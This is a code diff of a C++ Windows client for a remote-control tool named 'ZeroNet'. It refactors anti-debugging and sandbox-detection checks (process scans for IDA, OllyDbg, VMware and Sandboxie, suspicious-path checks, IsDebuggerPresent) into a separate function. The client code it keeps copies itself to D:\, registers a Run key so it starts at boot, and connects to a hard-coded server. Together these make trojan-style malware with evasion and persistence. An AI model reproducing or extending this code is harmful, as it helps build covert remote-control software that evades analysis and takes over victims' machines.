@@ -1,56 +1,18 @@
 #include "stdafx.h"
 #include <winsock2.h>
 #include <iostream>
+#include "safety.h"
 #include "zeroclient.h"
-#include "cmdspy.h"
-#include "tlhelp32.h"
 
 int gOffsetDomain = 10;
 char gDomain[100] = "DNSDNSDNS:127.0.0.1 ";
 int gOffsetPort = 13;
 char gPort[100] = "PORTPORTPORT:18000 ";
-char debug_name[5][100]={"idaq.exe","idaq64.exe","VMwareTray.exe","SbieSvc.exe","OllyDBG.exe"};
-char path_name[7][100]={"debug","virus","temp","ida","olly","disasm","hack"};
 
 
 // Libraries
 #pragma comment(lib, "jpeg/libjpeg.lib")
 #pragma comment(lib, "WS2_32")
-
-
-bool find_debuger(const char *processname){
-	for(int i=0;i<5;i++){
-		char *s=debug_name[i];
-		while(*processname!='\0' && *processname==*s){
-			processname++;
-			s++;
-		}
-		if(*processname=='\0' && *s=='\0') return true;
-		
-	}
-	return false;
-}
-
-bool find_virus_path(const char *processname){
-	const char *ori=processname;
-	for(int i=0;i<7;i++){
-		processname=ori;
-		while(*processname!='\0'){
-			char *s=path_name[i];
-			while(*processname!=*s && *processname!=(*s)-32 && *processname!='\0'){
-				processname++;
-			}
-			while(*processname!='\0' && (*processname==*s || *processname==(*s)-32)){
-				processname++;
-				s++;
-			}
-			if(*s=='\0'){
-				return true;
-			}
-		}
-	}
-	return false;
-}
 
 
 
@@ -59,44 +21,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
                      LPSTR     lpCmdLine,
                      int       nCmdShow)
 {
-	int IsSafe=0;
-
-    if(IDNO == MessageBox(NULL,"Really want to be controlled?","!!!!!",MB_YESNO))
-    {
-        IsSafe++;  //询问被控制人是否愿意
-    }
-
-    CreateMutexA(NULL,FALSE,"ZeroNet");
-    if(GetLastError() == ERROR_ALREADY_EXISTS) {
-        std::cout << "Same program already running" << std::endl;
-        IsSafe++;   //查询是否已运行
-    }
-
-	//多种反调试技术   SEH+IsDebuggerPresent+.....+全路径检测+进程遍历
-	PROCESSENTRY32 pe32;
-	pe32.dwSize=sizeof(pe32);
-	HANDLE hprocesssnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
-	if(INVALID_HANDLE_VALUE!=hprocesssnapshot){
-		BOOL bprocess=Process32First(hprocesssnapshot,&pe32);
-		while(bprocess){
-			if(find_debuger(pe32.szExeFile)){
-				IsSafe++;
-			}
-		bprocess=Process32Next(hprocesssnapshot,&pe32);
-		}
-	}
-
-	char filename[MAX_PATH];
-	if(GetModuleFileName(NULL,filename,MAX_PATH)){
-		if(find_virus_path(filename)){
-			IsSafe++;
-		}
-	}
-
-	if(IsDebuggerPresent()){
-		IsSafe++;
-	}
-
+	int IsSafe=isSafety();
 	while(!IsSafe)
 	{
 		WSAData wsaData;
@@ -104,7 +29,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 			std::cout << "Failed to initialize WSA" << std::endl;
 			return -1;
 		}
-
+        //copy到D盘根目录下
 		char sourcefile[MAX_PATH] = { 0 };
 		DWORD dwRet=GetModuleFileName(NULL, sourcefile, MAX_PATH);
 		HANDLE sourcehandle=CreateFile(sourcefile,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
@@ -130,13 +55,13 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 			CloseHandle(sourcehandle);
 			CloseHandle(desthandle);
 		}
-
+		//添加开机自启注册表
 		HKEY hKey;
 		LPCTSTR lpRun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";
 		RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
-		RegSetValueEx(hKey, TEXT("ZeroNet"), 0, REG_SZ, (BYTE *)"D:\\ZeroNet.exe", dwRet);
+		RegSetValueEx(hKey, TEXT("ZeroNet"), 0, REG_SZ, (BYTE *)"D:\\ZeroNet.exe", dwRet);  
 		RegCloseKey(hKey);
-
+		//连接sever
 		ZeroClient client;
 		client.hInst = hInstance;
 		while (1) {
